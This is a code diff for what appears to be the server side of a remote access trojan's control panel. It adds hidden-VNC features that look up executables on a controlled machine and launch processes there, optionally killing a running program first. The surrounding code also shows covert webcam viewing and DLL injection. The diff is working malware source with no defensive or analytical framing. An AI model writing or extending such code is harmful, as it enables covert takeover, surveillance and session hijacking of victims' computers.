@@ -494,6 +494,17 @@ export function handleHVNCCloneProgress(clientId: string, payload: any) {
   }
 }
 
+export function handleHVNCLookupResult(clientId: string, payload: any) {
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, {
+      type: "hvnc_lookup_result",
+      exe: String(payload.exe || ""),
+      path: String(payload.path || ""),
+      done: !!payload.done,
+    });
+  }
+}
+
 export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
   const payload = decodeViewerPayload(raw);
   if (!payload || typeof payload.type !== "string") return;
@@ -670,8 +681,14 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     case "hvnc_key_up":
       if (state.isStreaming) sendHVNCCommand(target, "hvnc_key_up", { key: payload.key || "", code: payload.code || "" });
       break;
+    case "hvnc_lookup":
+      sendHVNCCommand(target, "hvnc_lookup", { exe: String(payload.exe || "") });
+      break;
     case "hvnc_start_process":
-      sendHVNCCommand(target, "hvnc_start_process", { path: String(payload.path || "") });
+      sendHVNCCommand(target, "hvnc_start_process", {
+        path: String(payload.path || ""),
+        kill_exe: String(payload.kill_exe || ""),
+      });
       break;
     case "hvnc_start_process_injected": {
       const dllData = getInjectionDllBytes();
